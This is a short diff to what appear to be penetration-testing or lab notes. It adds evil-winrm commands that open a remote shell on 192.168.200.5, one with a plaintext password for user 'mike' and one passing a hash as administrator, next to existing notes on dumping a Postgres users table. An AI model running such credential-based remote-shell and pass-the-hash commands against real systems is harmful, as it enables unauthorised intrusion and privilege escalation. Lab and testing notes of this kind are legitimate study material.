@@ -153,6 +153,11 @@ psql -h 192.168.200.5 -U postgres -p 5437
 \d
 select * from users; 
 
+# 5985 WinRM
+Microsoft HTTPAPI httpd 2.0
+evil-winrm -i 192.168.200.5 -u mike -p helps
+evil-winrm -i 192.168.200.5 -u administrator -H 7dfclsdfklesk..
+ 
 ===================================
 # Consider
 mxweb mxcurls mxsamba mxbrutes
